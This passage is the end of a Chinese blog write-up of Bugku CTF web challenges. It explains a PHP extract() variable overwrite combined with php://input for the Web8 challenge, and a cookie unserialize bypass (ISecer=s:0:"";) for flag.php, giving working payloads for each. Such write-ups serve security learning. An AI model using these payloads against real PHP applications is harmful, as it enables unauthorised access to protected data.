+<h4 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))&#123;</span><br><span class="line"><span class="variable">$f</span> = trim(file_get_contents(<span class="variable">$fn</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>$ac的值===$f，而**$f<strong>的值是从文件名为</strong>$fn<strong>的文件中读取的，我们并不知道</strong>$fn**的值是什么，这时看到了extract()，可以使用变量覆盖，get传入一个$ac的值，然后利用php伪协议，使$fn=php://input，当通过post提交一个和$ac一样的值，然后php://input会读入这个值，使$fn=这个值，从而覆盖掉$f的值</p>
+<p>payload：get：<code>?ac=1&amp;fn=php://input</code>          post :   <code>1</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALjdAJ.png" alt="ALjdAJ.png"></p>
+<p>在网上还看到一种方法，根据题目提示，访问flag.txt，看到文件内容是flags，然后构造payload：</p>
+<p><code>?ac=flags&amp;fn=flag.txt</code>，也是可以的，这个应该才是出题意图。</p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALjogP.png" alt="ALjogP.png"></p>
+<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><p>看看源码，发现login只是个按钮，怪不得怎么点都没反应</p>
+<p>这个提示hint，找了半天不知道是什么用，最后，get传进去hint=1，发现了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>(unserialize($cookie) === “$KEY”)</strong></p>
+<p>这样看起来，只要把<code>$KEY=&#39;ISecer:www.isecer.com&#39;</code>序列化之后，给cookie就可以了，事实上，也确实是把$KEY序列化之后给cookie，只不过，$KEY在序列化的时候，还未定义，是个空值，而不是<code>$KEY=&#39;ISecer:www.isecer.com&#39;</code>，所以，把$KEY=””序列化之后为<code>s:0:&quot;&quot;;</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALvbxx.png" alt="ALvbxx.png"></p>
+<p>cookie的参数是ISecer，所以payload：</p>
+<blockquote>
+<p>cookie: ISecer=s:0:””;</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALxVeS.png" alt="ALxVeS.png"></p>
+<h4 id="Trim的笔记本"><a href="#Trim的笔记本" class="headerlink" title="Trim的笔记本"></a>Trim的笔记本</h4>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ctf/">ctf</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/web/">web</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/Bugku-Web-WriteUp/" data-title="Bugku_Web_WriteUp | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2018/12/20/靶场/Upload-labs文件上传靶场通关/" title="Upload_labs文件上传靶场通关">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Upload_labs文件上传靶场通关</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/12/16/大学CTF/CUMT双月赛一/"  title="CUMT-12月月赛">
+ <strong>下一篇：</strong><br/> 
+ <span>CUMT-12月月赛
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2"><span class="toc-number">2.</span> <span class="toc-text">Web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80-Get"><span class="toc-number">4.</span> <span class="toc-text">web基础$_Get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80-POST"><span class="toc-number">5.</span> <span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%9B%E7%9B%BE"><span class="toc-number">6.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3"><span class="toc-number">7.</span> <span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B"><span class="toc-number">9.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">10.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E4%B8%80"><span class="toc-number">11.</span> <span class="toc-text">变量一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3-1"><span class="toc-number">12.</span> <span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B4%E7%AD%89%E8%88%B1"><span class="toc-number">13.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-number">14.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F"><span class="toc-number">15.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web4"><span class="toc-number">16.</span> <span class="toc-text">Web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%9C%A8index%E9%87%8C"><span class="toc-number">17.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1"><span class="toc-number">18.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB2"><span class="toc-number">19.</span> <span class="toc-text">本地包含2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">20.</span> <span class="toc-text">各种绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82getshell"><span class="toc-number">21.</span> <span class="toc-text">求getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="toc-number">22.</span> <span class="toc-text">程序员的本地网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%AC%BA%E9%AA%97"><span class="toc-number">23.</span> <span class="toc-text">cookie欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="toc-number">24.</span> <span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">25.</span> <span class="toc-text">过狗一句话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-collision"><span class="toc-number">25.1.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#never-give-up"><span class="toc-number">25.2.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#welcome-to-bugkuctf"><span class="toc-number">25.3.</span> <span class="toc-text">welcome to bugkuctf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="toc-number">25.4.</span> <span class="toc-text">字符？正则？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="toc-number">25.5.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web8"><span class="toc-number">25.6.</span> <span class="toc-text">Web8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-php"><span class="toc-number">25.7.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trim%E7%9A%84%E7%AC%94%E8%AE%B0%E6%9C%AC"><span class="toc-number">25.8.</span> <span class="toc-text">Trim的笔记本</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
